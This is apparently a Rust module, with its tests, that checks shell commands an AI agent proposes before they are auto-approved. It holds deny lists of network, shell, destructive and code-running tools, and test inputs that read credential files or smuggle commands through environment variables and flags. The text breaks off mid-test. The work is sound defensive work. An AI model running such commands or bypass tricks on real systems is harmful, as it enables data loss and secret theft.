//! Reading a command: which "always allow" rule may be offered and matched for
//! it, and whether its text refers to a place outside the project.
//!
//! Pure string work; nothing is run and nothing is read from disk. The command
//! string is untrusted, so the rule is `None` ("ask every time") whenever the
//! shell could treat any part of it specially. When in doubt: `None`.

use std::path::Path;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ShellFamily {
    Posix,
    PowerShell,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Inspected {
    /// The rule that may be offered and matched, or `None` (always ask).
    pub rule: Option<String>,
    /// The rule key the card may offer to save, even when this exact command
    /// does not match it (`npm install lodash` offers `npm install`).
    pub offer: Option<String>,
    /// The text refers to a place outside the project (a hint for the card).
    pub outside: bool,
}

// ---------------------------------------------------------------------------
// The never-lists. Anything here never gets a rule, so it is asked about every
// time. The lists may be extended; they must never be shortened. Each group
// says why its entries are there.
// ---------------------------------------------------------------------------

type Group = (&'static str, &'static [&'static str]);

/// Programs that never get a rule (matched on the lower-cased file name
/// without `.exe`/`.cmd`/`.bat`).
const NEVER_PROGRAMS: &[Group] = &[
    (
        "shells and interpreters: the argument is a program of the model's choosing",
        &[
            "sh",
            "bash",
            "zsh",
            "fish",
            "dash",
            "ksh",
            "csh",
            "tcsh",
            "cmd",
            "powershell",
            "pwsh",
            "python",
            "python3",
            "node",
            "nodejs",
            "deno",
            "bun",
            "ruby",
            "perl",
            "php",
            "lua",
            "tclsh",
            "rscript",
            "irb",
            "ts-node",
            "tsx",
            "java",
            "jshell",
            "swift",
            "osascript",
            "wsl",
            "mshta",
            "wscript",
            "cscript",
            "rundll32",
            "regsvr32",
        ],
    ),
    (
        "launchers and wrappers: they run whatever follows them",
        &[
            "env",
            "rustup",
            "xargs",
            "npx",
            "pnpx",
            "bunx",
            "uvx",
            "corepack",
            "eval",
            "exec",
            "sudo",
            "su",
            "doas",
            "nice",
            "ionice",
            "nohup",
            "time",
            "timeout",
            "watch",
            "stdbuf",
            "setsid",
            "busybox",
            "chroot",
            "strace",
            "script",
            "command",
            "builtin",
            "source",
            ".",
            "trap",
            "alias",
            "export",
            "unset",
            "invoke-command",
            "icm",
            "invoke-item",
            "ii",
            "start",
            "start-process",
            "saps",
            "explorer",
            "open",
            "xdg-open",
        ],
    ),
    (
        "removing or overwriting files and disks",
        &[
            "rm",
            "rmdir",
            "del",
            "rd",
            "mv",
            "move",
            "dd",
            "format",
            "mkfs",
            "chmod",
            "chown",
            "remove-item",
            "ri",
            "erase",
            "move-item",
            "mi",
            "rename-item",
            "rni",
            "ren",
            "copy-item",
            "copy",
            "cpi",
            "cp",
            "ln",
            "touch",
            "truncate",
            "tee",
            "set-content",
            "sc",
            "add-content",
            "ac",
            "out-file",
            "new-item",
            "ni",
            "set-item",
            "si",
            "clear-content",
            "clc",
            "diskutil",
            "mount",
            "umount",
        ],
    ),
    (
        "PowerShell code execution and aliases of it",
        &[
            "invoke-expression",
            "iex",
            "add-type",
            "new-object",
            "new-alias",
            "set-alias",
            "sal",
            "import-module",
            "ipmo",
            "set-executionpolicy",
        ],
    ),
    (
        "build tools whose arguments name a script or target to run",
        &["make", "just", "task", "ant", "gradle", "gradlew", "mvn"],
    ),
    (
        "containers and remote machines: they run code elsewhere or move data out",
        &[
            "docker",
            "podman",
            "kubectl",
            "ssh",
            "scp",
            "rsync",
            "curl",
            "wget",
            "nc",
            "ncat",
            "telnet",
            "ftp",
            "invoke-webrequest",
            "iwr",
            "invoke-restmethod",
            "irm",
        ],
    ),
    (
        "programs that run commands or edit files through their arguments",
        &[
            "find", "awk", "sed", "tar", "unzip", "zip", "sqlite3", "psql", "mysql", "vi", "vim",
            "nvim", "view", "emacs", "nano", "ed", "ex", "less", "more", "man", "code", "cursor",
        ],
    ),
    (
        "package managers that install or run code system-wide",
        &[
            "pip", "pip3", "pipx", "uv", "conda", "brew", "apt", "apt-get", "yum", "dnf", "pacman",
            "choco", "winget", "scoop",
        ],
    ),
    (
        "system services, processes and the machine itself",
        &[
            "launchctl",
            "systemctl",
            "service",
            "crontab",
            "kill",
            "killall",
            "pkill",
            "shutdown",
            "reboot",
            "schtasks",
            "reg",
            "certutil",
            "bitsadmin",
            "msiexec",
            "wmic",
            "net",
            "stop-process",
            "spps",
            "stop-service",
        ],
    ),
];

/// Rules (`program sub-command`, lower-case) that never get offered.
const NEVER_RULES: &[Group] = &[
    (
        "git: rewrites history, discards work or changes what the repository runs",
        &[
            "git push",
            "git reset",
            "git clean",
            "git checkout",
            "git restore",
            "git commit",
            "git add",
            "git rm",
            "git mv",
            "git merge",
            "git rebase",
            "git pull",
            "git fetch",
            "git clone",
            "git config",
            "git stash",
            "git tag",
            "git branch",
            "git switch",
            "git apply",
            "git am",
            "git cherry-pick",
            "git revert",
            "git submodule",
            "git worktree",
            "git gc",
            "git filter-branch",
            "git update-ref",
            "git remote",
        ],
    ),
    (
        "package runners: these sub-commands execute an arbitrary script or program",
        &[
            "npm exec",
            "npm x",
            "npm run",
            "npm run-script",
            "npm start",
            "npm explore",
            "npm init",
            "npm create",
            "npm link",
            "npm login",
            "npm adduser",
            "npm publish",
            "npm config",
            "npm set",
            "pnpm exec",
            "pnpm dlx",
            "pnpm run",
            "pnpm start",
            "pnpm create",
            "pnpm node",
            "yarn exec",
            "yarn dlx",
            "yarn run",
            "yarn start",
            "yarn create",
            "yarn node",
            "bun x",
            "bun run",
            "cargo run",
            "cargo install",
            "cargo publish",
            "go run",
            "go install",
            "go generate",
            "dotnet run",
            "rustup run",
        ],
    ),
    (
        "aliases and abbreviations of the script runners, and commands that run scripts",
        &[
            "npm rum",
            "npm urn",
            "npm restart",
            "npm stop",
            "npm rebuild",
            "npm rb",
            "pnpm restart",
            "pnpm stop",
            "pnpm rebuild",
            "pnpm rb",
            "yarn restart",
            "yarn stop",
            "cargo r",
        ],
    ),
];

/// Programs whose second word is a sub-command; the rule key is
/// `"{program} {sub}"`.
const SUBCOMMAND_PROGRAMS: &[&str] = &[
    "git", "npm", "pnpm", "yarn", "bun", "cargo", "go", "dotnet", "pip", "pip3", "poetry", "uv",
    "docker", "podman", "kubectl", "gh", "brew", "apt", "apt-get", "composer", "bundle", "rails",
    "mix", "gradle", "gradlew", "mvn", "deno",
];

/// The package runners accept abbreviations and aliases of `run` and `exec`
/// (`npm rum`, `npm run-s`, `npm exe`, `npm x`); none of them is ever a rule.
fn runner_alias(program: &str, sub: &str) -> bool {
    matches!(program, "npm" | "pnpm" | "yarn" | "bun")
        && !sub.is_empty()
        && ("run".starts_with(sub)
            || matches!(sub, "rum" | "urn")
            || sub.starts_with("run")
            || "exec".starts_with(sub)
            || sub.starts_with("exec")
            || sub.starts_with('x'))
}

/// Both never-lists in one place.
pub struct Never {
    pub programs: &'static [Group],
    pub rules: &'static [Group],
}

pub const NEVER: Never = Never {
    programs: NEVER_PROGRAMS,
    rules: NEVER_RULES,
};

fn listed(groups: &[Group], name: &str) -> bool {
    groups.iter().any(|(_, items)| items.contains(&name))
}

/// Case-insensitive.
pub fn is_never_program(name: &str) -> bool {
    let name = name.to_ascii_lowercase();
    name.starts_with("python") || name.starts_with("pypy") || listed(NEVER_PROGRAMS, &name)
}

/// Case-insensitive.
pub fn is_never_rule(rule: &str) -> bool {
    listed(NEVER_RULES, &rule.to_ascii_lowercase())
}

// ---------------------------------------------------------------------------
// Reading a command
// ---------------------------------------------------------------------------

pub fn inspect(command: &str, family: ShellFamily, project_root: &Path) -> Inspected {
    let outside = refers_outside(command, project_root);
    let rule = if outside {
        None
    } else {
        rule_for(command, family)
    };
    Inspected {
        rule,
        offer: offer_for(command, family),
        outside,
    }
}

/// True when the command yields a rule and the user has saved exactly it.
pub fn allowed(command: &str, family: ShellFamily, root: &Path, saved: &[String]) -> bool {
    match inspect(command, family, root).rule {
        Some(rule) => saved.contains(&rule),
        None => false,
    }
}

#[derive(Default)]
struct Tok {
    text: String,
    quoted: bool,
}

fn is_plain_space(c: char) -> bool {
    c == ' '
}

/// Characters the shell treats specially when they are not quoted.
fn forbidden_unquoted(c: char, family: ShellFamily) -> bool {
    let common = "|&;<>(){}$`!*?[]#";
    match family {
        ShellFamily::Posix => common.contains(c) || c == '\\',
        // `@` (splat, arrays, hash tables), `%` (alias, --%), `,` (array).
        ShellFamily::PowerShell => common.contains(c) || "@%,".contains(c),
    }
}

/// Split into words, or `None` when anything in the text is special to the
/// shell or the quoting is not simple and balanced. Used only to decide what
/// may be offered; a rule never matches a command with a quote in it.
fn lex(command: &str, family: ShellFamily) -> Option<Vec<Tok>> {
    let ps = family == ShellFamily::PowerShell;
    let chars: Vec<char> = command.chars().collect();
    let mut toks: Vec<Tok> = Vec::new();
    let mut cur: Option<Tok> = None;
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        i += 1;
        if !is_plain_space(c) && (c.is_control() || c.is_whitespace()) {
            return None;
        }
        if ps && !c.is_ascii() {
            return None;
        }
        match c {
            ' ' => toks.extend(cur.take()),
            '\'' | '"' => {
                // PowerShell: a quote only ever makes a whole word.
                if ps && cur.is_some() {
                    return None;
                }
                let tok = cur.get_or_insert_with(Tok::default);
                tok.quoted = true;
                loop {
                    let d = *chars.get(i)?; // unclosed quote
                    i += 1;
                    if d == c {
                        break;
                    }
                    if !is_plain_space(d) && (d.is_control() || d.is_whitespace()) {
                        return None;
                    }
                    if ps && (!d.is_ascii() || d == '$' || d == '`') {
                        return None;
                    }
                    if c == '"' && (d == '$' || d == '`' || (!ps && (d == '\\' || d == '!'))) {
                        return None;
                    }
                    tok.text.push(d);
                }
                if ps && !matches!(chars.get(i), None | Some(' ')) {
                    return None;
                }
            }
            _ => {
                if forbidden_unquoted(c, family) || (c == '~' && cur.is_none()) {
                    return None;
                }
                cur.get_or_insert_with(Tok::default).text.push(c);
            }
        }
    }
    toks.extend(cur);
    if toks.is_empty() { None } else { Some(toks) }
}

const EXTENSIONS: [&str; 4] = [".exe", ".cmd", ".bat", ".ps1"];

/// Lower-case name with every Windows extension removed (for the never-list
/// and the look-alike check).
fn stripped_base(text: &str) -> String {
    let mut name = text.to_ascii_lowercase();
    while let Some(s) = EXTENSIONS.iter().find_map(|e| name.strip_suffix(e)) {
        name = s.to_string();
    }
    name
}

/// A program word: ASCII letters, digits and `_ - . +`, starting with a
/// letter or digit, not ending in `.` (Windows ignores a trailing dot). No
/// path separator is possible.
fn program_word(text: &str) -> bool {
    text.chars()
        .next()
        .is_some_and(|c| c.is_ascii_alphanumeric())
        && !text.ends_with('.')
        && text
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "_-.+".contains(c))
}

fn plain_sub(s: &str) -> bool {
    !s.is_empty()
        && !s.starts_with('-')
        && s.chars()
            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-')
}

/// The rule key from the program word and (for sub-command programs) the
/// second word. `second` is `None` when it is missing or quoted.
fn key_for(program_text: &str, second: Option<&str>, family: ShellFamily) -> Option<String> {
    if !program_word(program_text) {
        return None;
    }
    let base = stripped_base(program_text);
    if is_never_program(&base) || is_never_program(program_text) {
        return None;
    }
    let program = match family {
        ShellFamily::Posix => program_text.to_string(),
        ShellFamily::PowerShell => {
            let lower = program_text.to_ascii_lowercase();
            EXTENSIONS
                .iter()
                .find_map(|e| lower.strip_suffix(e))
                .map_or(lower.clone(), str::to_string)
        }
    };
    // `GIT`, `git.exe`, `npm.cmd.exe` reach the same program on some systems
    // but are not the program the rule names.
    if program != base && SUBCOMMAND_PROGRAMS.contains(&base.as_str()) {
        return None;
    }
    let key = if SUBCOMMAND_PROGRAMS.contains(&program.as_str()) {
        let sub = second.filter(|s| plain_sub(s))?;
        if runner_alias(&program, sub) {
            return None;
        }
        format!("{program} {sub}")
    } else {
        program
    };
    if is_never_rule(&key) {
        return None;
    }
    Some(key)
}

/// What the card may offer to save: the key alone; the arguments do not matter
/// (offering runs nothing). The shell-syntax checks still apply.
fn offer_for(command: &str, family: ShellFamily) -> Option<String> {
    let toks = lex(command, family)?;
    if toks[0].quoted {
        return None;
    }
    let second = toks.get(1).filter(|t| !t.quoted).map(|t| t.text.as_str());
    key_for(&toks[0].text, second, family)
}

// ---- the options table ----------------------------------------------------

#[derive(Clone, Copy)]
enum Val {
    Digits,
    /// `A-Z a-z 0-9 _`
    Word,
    /// a crate or feature name: `A-Z a-z 0-9 _ -`
    Name,
}

#[derive(Clone, Copy, PartialEq, Eq)]
enum Pos {
    /// no positional at all
    None,
    /// relative paths and plain words
    Paths,
    /// one plain word (a test-name filter)
    OneWord,
    /// the single positional `./...`
    Dots,
}

struct Spec {
    /// options without a value, matched exactly
    flags: &'static [&'static str],
    /// letters allowed in one single-dash cluster such as `-la`
    cluster: &'static str,
    /// options followed by one value token
    values: &'static [(&'static str, Val)],
    pos: Pos,
}

const CARGO_FLAGS: &[&str] = &[
    "--release",
    "--workspace",
    "--all",
    "--all-targets",
    "--all-features",
    "--no-default-features",
    "--lib",
    "--bins",
    "--tests",
    "-q",
    "--quiet",
    "-v",
    "--verbose",
    "--locked",
    "--offline",
];
const CARGO_VALUES: &[(&str, Val)] = &[
    ("-p", Val::Name),
    ("--package", Val::Name),
    ("--features", Val::Name),
];
const GO_FLAGS: &[&str] = &["-v", "-short", "-race", "-cover"];
const GO_VALUES: &[(&str, Val)] = &[("-run", Val::Word), ("-count", Val::Digits)];
const NONE: Spec = Spec {
    flags: &[],
    cluster: "",
    values: &[],
    pos: Pos::Paths,
};

/// The complete list of what a rule lets through. A key that is not here
/// accepts no options, only positionals.
fn spec_for(key: &str) -> Spec {
    match key {
        "ls" => Spec {
            cluster: "laAhRtrS1Fd",
            ..NONE
        },
        "head" | "tail" => Spec {
            values: &[("-n", Val::Digits)],
            ..NONE
        },
        "wc" => Spec {
            flags: &["-l", "-w", "-c"],
            ..NONE
        },
        "pwd" | "whoami" | "date" => Spec {
            pos: Pos::None,
            ..NONE
        },
        "git status" => Spec {
            flags: &["-s", "--short", "-b", "--branch", "--porcelain"],
            ..NONE
        },
        "git diff" => Spec {
            flags: &[
                "--stat",
                "--name-only",
                "--name-status",
                "--staged",
                "--cached",
            ],
            ..NONE
        },
        "git log" => Spec {
            flags: &["--oneline", "--stat", "--name-only", "--graph", "--all"],
            values: &[("-n", Val::Digits)],
            ..NONE
        },
        "git show" | "git blame" => Spec {
            flags: &["--stat", "--name-only"],
            ..NONE
        },
        "npm install" | "npm ci" | "pnpm install" | "yarn install" | "bun install" | "npm test"
        | "pnpm test" | "yarn test" | "bun test" | "pip install" | "pip3 install" => Spec {
            pos: Pos::None,
            ..NONE
        },
        "cargo build" | "cargo check" | "cargo clippy" => Spec {
            flags: CARGO_FLAGS,
            values: CARGO_VALUES,
            pos: Pos::None,
            ..NONE
        },
        "cargo test" => Spec {
            flags: CARGO_FLAGS,
            values: CARGO_VALUES,
            pos: Pos::OneWord,
            ..NONE
        },
        "cargo fmt" => Spec {
            flags: &["--all", "--check"],
            pos: Pos::None,
            ..NONE
        },
        "go test" | "go build" => Spec {
            flags: GO_FLAGS,
            values: GO_VALUES,
            pos: Pos::Dots,
            ..NONE
        },
        "go vet" => Spec {
            flags: GO_FLAGS,
            values: GO_VALUES,
            pos: Pos::None,
            ..NONE
        },
        "pytest" => Spec {
            flags: &["-q", "-v", "-x", "-s"],
            values: &[("-k", Val::Word)],
            ..NONE
        },
        "tsc" => Spec {
            flags: &["--noEmit"],
            ..NONE
        },
        "prettier" => Spec {
            flags: &["--check"],
            ..NONE
        },
        _ => NONE,
    }
}

fn value_ok(kind: Val, v: &str) -> bool {
    let word = |c: char| c.is_ascii_alphanumeric() || c == '_';
    match kind {
        Val::Digits => !v.is_empty() && v.chars().all(|c| c.is_ascii_digit()),
        Val::Word => !v.is_empty() && v.chars().all(word),
        Val::Name => v.chars().next().is_some_and(word) && v.chars().all(|c| word(c) || c == '-'),
    }
}

/// A relative path or plain word that is not a secret and does not leave the
/// project.
fn path_ok(p: &str) -> bool {
    !p.starts_with('/')
        && !p.contains('@')
        && p.split('/').all(|c| c != ".." && !c.starts_with('-'))
        && !super::secrets::is_secret(p)
}

fn args_ok(spec: &Spec, args: &[&str]) -> bool {
    let mut used_single = false;
    let mut i = 0;
    while i < args.len() {
        let a = args[i];
        i += 1;
        if a.starts_with('-') {
            if spec.flags.contains(&a) {
                continue;
            }
            if let Some((_, kind)) = spec.values.iter().find(|(n, _)| *n == a) {
                match args.get(i) {
                    Some(v) if value_ok(*kind, v) => {
                        i += 1;
                        continue;
                    }
                    _ => return false,
                }
            }
            let letters = a.strip_prefix('-').unwrap_or("");
            if !spec.cluster.is_empty()
                && !letters.is_empty()
                && !letters.starts_with('-')
                && letters.chars().all(|c| spec.cluster.contains(c))
            {
                continue;
            }
            return false;
        }
        let ok = match spec.pos {
            Pos::None => false,
            Pos::Paths => path_ok(a),
            Pos::OneWord => !used_single && value_ok(Val::Word, a),
            Pos::Dots => !used_single && a == "./...",
        };
        if !ok {
            return false;
        }
        used_single = true;
    }
    true
}

/// The whole command is only `A-Z a-z 0-9 _ . @ / + -` and single spaces.
fn plain_command(command: &str) -> bool {
    !command.is_empty()
        && command.len() <= 500
        && !command.starts_with(' ')
        && !command.ends_with(' ')
        && !command.contains("  ")
        && command
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "_./@+- ".contains(c))
}

fn rule_for(command: &str, family: ShellFamily) -> Option<String> {
    if !plain_command(command) {
        return None;
    }
    let words: Vec<&str> = command.split(' ').collect();
    let key = key_for(words[0], words.get(1).copied(), family)?;
    let consumed = if key.contains(' ') { 2 } else { 1 };
    args_ok(&spec_for(&key), &words[consumed..]).then_some(key)
}

// ---------------------------------------------------------------------------
// Outside the project (a hint; false positives are fine)
// ---------------------------------------------------------------------------

/// Every piece of the command that could be a path: whitespace- and
/// operator-separated words (quotes removed), plus the tail of each word
/// starting after any character that is not a letter, digit or path
/// character (`=`, `:`, `,`, `-`, ...). Words that start with `-` also yield
/// every suffix (`-ld/etc`). Slicing is by character.
fn candidates(command: &str) -> Vec<String> {
    let mut words: Vec<String> = Vec::new();
    let mut cur = String::new();
    let mut quote: Option<char> = None;
    for c in command.chars() {
        match quote {
            Some(q) if c == q => quote = None,
            Some(_) => cur.push(c),
            None if c == '\'' || c == '"' => quote = Some(c),
            None if c.is_whitespace() || "|&;<>(){}`".contains(c) => {
                words.push(std::mem::take(&mut cur));
            }
            None => cur.push(c),
        }
    }
    words.push(cur);
    let mut out = Vec::new();
    for w in words.into_iter().filter(|w| !w.is_empty()) {
        let dashed = w.starts_with('-');
        let mut prev: Option<char> = None;
        for (i, c) in w.char_indices() {
            let boundary = prev.is_none_or(|p| !(p.is_alphanumeric() || "_./\\".contains(p)));
            if boundary || dashed {
                out.push(w[i..].to_string());
            }
            prev = Some(c);
        }
    }
    out
}

/// Lexically normalised components of a `/`-separated path.
fn components(path: &str) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    for c in path.split('/') {
        match c {
            "" | "." => {}
            ".." => {
                out.pop();
            }
            _ if cfg!(any(target_os = "macos", windows)) => out.push(c.to_lowercase()),
            _ => out.push(c.to_string()),
        }
    }
    out
}

fn refers_outside(command: &str, root: &Path) -> bool {
    let root_comps = components(&root.to_string_lossy().replace('\\', "/"));
    candidates(command)
        .iter()
        .any(|c| piece_is_outside(c, &root_comps))
}

fn piece_is_outside(piece: &str, root: &[String]) -> bool {
    let lower = piece.to_lowercase();
    if lower.starts_with('~')
        || lower.starts_with("$home")
        || lower.starts_with("${home")
        || lower.starts_with("$env:")
        || lower.starts_with("$userprofile")
        || lower.starts_with("\\\\")
        || lower.starts_with('\\')
        || (lower.starts_with('%') && lower[1..].contains('%'))
    {
        return true;
    }
    let b = piece.as_bytes();
    let drive = b.len() >= 3
        && b[0].is_ascii_alphabetic()
        && b[1] == b':'
        && (b[2] == b'\\' || b[2] == b'/');
    let path = piece.replace('\\', "/");
    if drive || path.starts_with('/') {
        let comps = components(&path);
        if comps == ["dev", "null"] {
            return false;
        }
        return !(comps.len() >= root.len() && comps[..root.len()] == *root);
    }
    // Relative: does `..` climb above the project root?
    let mut depth: i32 = 0;
    for c in path.split('/') {
        match c {
            "" | "." => {}
            ".." => {
                depth -= 1;
                if depth < 0 {
                    return true;
                }
            }
            _ => depth += 1,
        }
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    const P: ShellFamily = ShellFamily::Posix;
    const W: ShellFamily = ShellFamily::PowerShell;

    fn root() -> &'static Path {
        Path::new("/home/u/proj")
    }

    fn rule_of(cmd: &str, family: ShellFamily) -> Option<String> {
        inspect(cmd, family, root()).rule
    }

    /// Every command: no rule and no offer.
    fn nothing(family: ShellFamily, cmds: &[&str]) {
        for c in cmds {
            let got = inspect(c, family, root());
            assert_eq!(got.rule, None, "rule for {c:?} ({family:?})");
            assert_eq!(got.offer, None, "offer for {c:?} ({family:?})");
        }
    }

    /// Every command: no rule (an offer is allowed).
    fn no_rule(family: ShellFamily, cmds: &[&str]) {
        for c in cmds {
            assert_eq!(rule_of(c, family), None, "rule for {c:?} ({family:?})");
        }
    }

    /// Rows: command, rule, offer, outside.
    fn table(family: ShellFamily, rows: &[(&str, Option<&str>, Option<&str>, bool)]) {
        for (cmd, rule, offer, outside) in rows {
            let got = inspect(cmd, family, root());
            assert_eq!(got.rule.as_deref(), *rule, "rule for {cmd:?} ({family:?})");
            assert_eq!(
                got.offer.as_deref(),
                *offer,
                "offer for {cmd:?} ({family:?})"
            );
            assert_eq!(got.outside, *outside, "outside for {cmd:?} ({family:?})");
        }
    }

    /// Commands that are matched: the rule and the offer are the same key.
    fn matched(family: ShellFamily, rows: &[(&str, &str)]) {
        for (cmd, key) in rows {
            let got = inspect(cmd, family, root());
            assert_eq!(
                got.rule.as_deref(),
                Some(*key),
                "rule for {cmd:?} ({family:?})"
            );
            assert_eq!(
                got.offer.as_deref(),
                Some(*key),
                "offer for {cmd:?} ({family:?})"
            );
            assert!(!got.outside, "outside for {cmd:?} ({family:?})");
        }
    }

    #[test]
    fn ordinary_commands_get_a_rule() {
        let rows = [
            ("npm install", "npm install"),
            ("npm test", "npm test"),
            ("npm ci", "npm ci"),
            ("cargo test", "cargo test"),
            ("cargo test --all", "cargo test"),
            ("cargo test --release", "cargo test"),
            ("cargo test my_filter", "cargo test"),
            ("cargo test -p my-crate", "cargo test"),
            ("cargo test --features foo", "cargo test"),
            ("cargo build --workspace", "cargo build"),
            ("cargo clippy --all-targets", "cargo clippy"),
            ("cargo fmt --check", "cargo fmt"),
            ("git status", "git status"),
            ("git status -s", "git status"),
            ("git diff --stat src/a.ts", "git diff"),
            ("git log -n 5", "git log"),
            ("git log --oneline", "git log"),
            ("git blame src/a.ts", "git blame"),
            ("git show --stat", "git show"),
            ("ls", "ls"),
            ("ls -la", "ls"),
            ("ls -la src", "ls"),
            ("cat README.md", "cat"),
            ("cat src/a.ts", "cat"),
            ("head -n 5 README.md", "head"),
            ("wc -l a.txt", "wc"),
            ("pwd", "pwd"),
            ("pytest", "pytest"),
            ("pytest tests/unit", "pytest"),
            ("pytest -q -k login", "pytest"),
            ("go test ./...", "go test"),
            ("go test -run TestX", "go test"),
            ("go test -count 1 -v", "go test"),
            ("go build ./...", "go build"),
            ("go vet", "go vet"),
            ("tsc --noEmit", "tsc"),
            ("eslint src", "eslint"),
            ("prettier --check src", "prettier"),
        ];
        matched(P, &rows);
        matched(W, &rows);
    }

    #[test]
    fn powershell_lower_cases_and_strips_one_extension() {
        matched(
            W,
            &[
                ("NPM.CMD install", "npm install"),
                ("npm.exe install", "npm install"),
                ("Get-ChildItem", "get-childitem"),
                ("LS -la", "ls"),
            ],
        );
        no_rule(W, &["npm.cmd.exe install"]);
    }

    #[test]
    fn posix_uses_the_program_exactly_as_written() {
        // Finding 10: no lower-casing, no extension stripping.
        let got = inspect("LS", P, root());
        assert_eq!(got.rule.as_deref(), Some("LS"));
        let saved = vec!["ls".to_string(), "cat".to_string()];
        assert!(!allowed("LS", P, root(), &saved));
        assert!(!allowed("LS -la", P, root(), &saved));
        assert!(!allowed("cat.exe /etc/passwd", P, root(), &saved));
        assert!(!allowed("CAT README.md", P, root(), &saved));
        assert!(!allowed("cat.exe README.md", P, root(), &saved));
        assert_eq!(inspect("LS -la", P, root()).rule, None);
        assert_eq!(inspect("cat.exe /etc/passwd", P, root()).rule, None);
        // A case or extension variant of a sub-command program never matches.
        no_rule(
            P,
            &[
                "GIT status",
                "Git push",
                "git.exe status",
                "NPM install",
                "RM x",
            ],
        );
        nothing(P, &["RM x", "SUDO ls"]);
    }

    #[test]
    fn rule_needs_the_plain_character_set() {
        no_rule(
            P,
            &[
                "ls  -la",
                " ls",
                "ls ",
                "ls\t-la",
                "ls\n",
                "ls -la\u{a0}",
                "ls 'src'",
                "ls \"src\"",
                "ls src=a",
                "ls a:b",
                "ls a,b",
                "ls ~/x",
                "ls $X",
                "ls %X%",
                "ls ^x",
                "ls a\\b",
                "cat é",
                "cat a\u{0}",
                "",
                " ",
            ],
        );
        let long = format!("cat {}", "a".repeat(497));
        assert_eq!(long.len(), 501);
        assert_eq!(rule_of(&long, P), None);
        let max = format!("cat {}", "a".repeat(496));
        assert_eq!(rule_of(&max, P).as_deref(), Some("cat"));
    }

    #[test]
    fn shell_syntax_gives_no_rule_and_no_offer() {
        nothing(
            P,
            &[
                "ls | wc",
                "ls && ls",
                "ls || ls",
                "ls ; ls",
                "ls &",
                "ls > f",
                "ls < f",
                "ls >> f",
                "ls 2> f",
                "ls 2>f",
                "echo $(x)",
                "echo `x`",
                "(ls)",
                "echo ${x}",
                "ls\nls",
                "ls\r\nls",
                "sudo ls",
                "npm install 'a",
                "npm install \"a",
                "npm install \"a'",
                "echo $IFS",
                "ls $1",
                "echo $((1+1))",
                "echo \"$HOME\"",
                "echo \"`id`\"",
                "echo \"a\\b\"",
                "echo \"!x\"",
                "ls \\\nfoo",
                "ls a\\ b",
                "ls \\;",
                "ls {a,b}",
                "ls a{b",
                "~root/x",
                "~/bin/tool",
                "ls ~",
                "ls ~root",
                "*",
                "l? x",
                "[ls] x",
                "ls *.ts",
                "ls file?",
                "ls [ab]",
                "PATH=. npm install",
                "NODE_OPTIONS=--require=x npm install",
                "A=1 B=2 ls",
                "cat <(ls)",
                "cat >(ls)",
                "cat <<EOF",
                "cat <<< x",
                "ls # hi",
                "ls #",
                "!ls",
                "ls !",
                "-ls",
                "--version",
                "ls\tx",
                "ls\u{b}x",
                "ls\u{0}",
                "ls\u{a0}x",
                "ls\u{2028}x",
                "",
                "   ",
                "\n",
                "npm é install",
                "ｎpm install",
                "npм install",
                "'npm' install",
                "\"npm\" install",
                "np'm' install",
                "npm 'install'",
                "git 'status'",
                "npm install=x",
                "=ls",
                ".",
                ". ./x",
                "source x",
                "ls: x",
                "ls.",
                "/bin/rm x",
                "./node_modules/.bin/tsc",
                "bin/tool",
                "..\\x",
                "ls/x",
                "python3.12 x",
                "PYTHON x",
                "git -c core.pager=x status",
                "git --exec-path=/x status",
                "git -C /elsewhere status",
                "git --version",
                "git -p status",
                "npm --prefix /x install",
                "npm -g install x",
                "pnpm -C /x install",
                "yarn --cwd /x install",
                "cargo +nightly test",
                "cargo --config x=y test",
                "go -C /x test",
                "dotnet --info",
                "npm",
                "git",
                "cargo",
            ],
        );
    }

    #[test]
    fn quoted_or_decorated_arguments_keep_an_offer_but_no_rule() {
        table(
            P,
            &[
                ("npm install lodash", None, Some("npm install"), false),
                ("npm install --save-dev x", None, Some("npm install"), false),
                ("npm install 'a;b'", None, Some("npm install"), false),
                ("npm install @scope/pkg", None, Some("npm install"), false),
                ("cargo test --target-dir /x", None, Some("cargo test"), true),
                ("git log --output x", None, Some("git log"), false),
                ("cat .env", None, Some("cat"), false),
                ("cat /etc/passwd", None, Some("cat"), true),
                ("eslint --fix src", None, Some("eslint"), false),
                ("ls \"my dir\"", None, Some("ls"), false),
                ("go test -exec x", None, Some("go test"), false),
                ("echo 'a\\b'", None, Some("echo"), false),
                ("ls -la ünï", None, Some("ls"), false),
                ("git Status", None, None, false),
            ],
        );
    }

    #[test]
    fn never_programs_give_no_rule() {
        for (_, items) in NEVER.programs {
            for p in *items {
                for fam in [P, W] {
                    for cmd in [format!("{p} x"), p.to_uppercase(), format!("{p}.exe y")] {
                        let got = inspect(&cmd, fam, root());
                        assert_eq!(got.rule, None, "rule for {cmd:?} ({fam:?})");
                        assert_eq!(got.offer, None, "offer for {cmd:?} ({fam:?})");
                    }
                }
            }
        }
    }

    #[test]
    fn the_spec_lists_are_present_verbatim() {
        let programs = "sh bash zsh fish cmd powershell pwsh python python3 node deno bun ruby perl php env xargs npx pnpx bunx uvx eval exec rm rmdir del rd mv move dd format mkfs chmod chown remove-item ri erase move-item mi invoke-expression iex start-process sudo";
        for p in programs.split(' ') {
            assert!(is_never_program(p), "{p}");
        }
        for r in [
            "git push",
            "git reset",
            "git clean",
            "git checkout",
            "git restore",
        ] {
            assert!(is_never_rule(r), "{r}");
        }
        let extra = "make just task ant gradle gradlew mvn docker podman kubectl ssh scp rsync curl wget nc ncat telnet ftp osascript open xdg-open start explorer nohup time timeout watch find awk sed tee tar unzip zip pip pip3 pipx uv conda brew apt apt-get yum dnf pacman choco winget scoop launchctl systemctl service crontab kill killall pkill shutdown reboot diskutil mount umount ln cp touch truncate";
        for p in extra.split(' ') {
            assert!(is_never_program(p), "{p}");
        }
